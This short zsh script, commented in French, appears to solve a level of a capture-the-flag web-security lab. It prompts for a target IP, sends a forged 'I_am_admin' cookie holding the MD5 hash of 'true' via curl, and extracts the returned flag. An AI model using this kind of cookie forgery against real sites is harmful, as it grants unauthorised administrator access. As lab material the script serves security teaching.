#!/bin/zsh

# Affiche un message à l'utilisateur pour demander l'adresse IP
echo "On va envoyer true en MD5 au site\n\nDonne l'IP stp :"

# Lecture de l'IP fournie par l'utilisateur et stockage dans la variable IP_DARKLY
read  IP_DARKLY

# Vérifie si l'IP est vide (non fournie), et si c'est le cas, affiche un message d'erreur et termine le script
if [ -z $IP_DARKLY ]; then
    echo "Donne l'IP j'ai dit !"
    exit 1
fi

# Utilisation de curl pour envoyer un cookie I_am_admin=true au serveur
curl -b "I_am_admin=b326b5062b2f0e69046810717534cb09" "$IP_DARKLY" | grep Flag | awk -F': | <' '{print "\nThe flag => "$2}'
